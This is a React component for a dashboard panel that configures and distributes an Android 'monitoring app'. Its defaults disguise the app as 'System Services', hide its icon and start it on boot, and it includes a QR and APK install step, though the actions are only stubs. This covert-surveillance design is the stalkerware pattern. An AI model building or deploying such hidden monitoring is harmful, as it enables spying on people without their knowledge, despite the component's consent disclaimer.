
import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Switch } from "@/components/ui/switch";
import { Label } from "@/components/ui/label";
import { useToast } from "@/components/ui/use-toast";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Download, Smartphone } from "lucide-react";

export function MobileAppFeatures() {
  const { toast } = useToast();
  const [qrGenerated, setQrGenerated] = useState(false);

  const handleGenerateQR = () => {
    setQrGenerated(true);
    toast({
      title: "QR Code Generated",
      description: "The QR code for mobile app installation has been generated.",
    });
  };

  const handleDownloadApp = () => {
    toast({
      title: "Mobile App Download",
      description: "Android APK file download started.",
    });
  };

  return (
    <Card>
      <CardHeader>
        <CardTitle className="flex items-center gap-2">
          <Smartphone className="h-5 w-5" />
          <span>Android Mobile App</span>
        </CardTitle>
        <CardDescription>
          Configure and deploy the Android monitoring app.
        </CardDescription>
      </CardHeader>
      <CardContent className="space-y-6">
        <div className="grid md:grid-cols-2 gap-6">
          <div className="space-y-4">
            <div className="border rounded-md p-4 space-y-4">
              <div className="flex items-center gap-2">
                <Smartphone className="h-5 w-5 text-primary" />
                <h4 className="font-medium">Configuration</h4>
              </div>
              
              <div className="space-y-2">
                <div className="flex flex-col space-y-1.5">
                  <Label htmlFor="app-name">App Display Name</Label>
                  <Input id="app-name" defaultValue="System Services" />
                </div>
                
                <div className="space-y-2 pt-2">
                  <Label>App Visibility</Label>
                  <Select defaultValue="hidden">
                    <SelectTrigger>
                      <SelectValue placeholder="Select visibility" />
                    </SelectTrigger>
                    <SelectContent>
                      <SelectItem value="visible">Visible (Normal App Icon)</SelectItem>
                      <SelectItem value="hidden">Hidden (No App Icon)</SelectItem>
                    </SelectContent>
                  </Select>
                </div>
                
                <div className="flex items-center justify-between pt-4">
                  <Label htmlFor="auto-start">Auto Start on Boot</Label>
                  <Switch id="auto-start" defaultChecked />
                </div>
                
                <div className="flex items-center justify-between pt-2">
                  <Label htmlFor="data-saving">Data Saving Mode</Label>
                  <Switch id="data-saving" defaultChecked />
                </div>
              </div>
              
              <div className="pt-2">
                <Button className="w-full gap-2" onClick={handleGenerateQR}>
                  Generate Installation QR
                </Button>
              </div>
            </div>
          </div>
          
          <div className="space-y-4">
            <div className="border rounded-md p-4 space-y-4 h-full flex flex-col">
              <div className="flex items-center gap-2">
                <Download className="h-5 w-5 text-primary" />
                <h4 className="font-medium">Installation</h4>
              </div>
              
              {qrGenerated ? (
                <div className="flex-1 flex flex-col items-center justify-center space-y-4">
                  <div className="w-48 h-48 bg-gray-200 flex items-center justify-center border">
                    <div className="text-xs text-center p-2">
                      [QR Code]<br />
                      Scan with Android device
                    </div>
                  </div>
                  <Button variant="outline" className="gap-2" onClick={handleDownloadApp}>
                    <Download className="h-4 w-4" />
                    Download APK
                  </Button>
                </div>
              ) : (
                <div className="flex-1 flex flex-col items-center justify-center text-center text-muted-foreground">
                  <p>Generate a QR code first to install the app.</p>
                </div>
              )}
            </div>
          </div>
        </div>
        
        <div className="rounded-md bg-amber-50 p-4 text-amber-800 text-sm mt-4">
          <p className="font-medium">Important:</p>
          <p className="mt-1">
            This monitoring software should only be used on devices you own or with explicit consent from the device owner.
          </p>
        </div>
      </CardContent>
    </Card>
  );
}
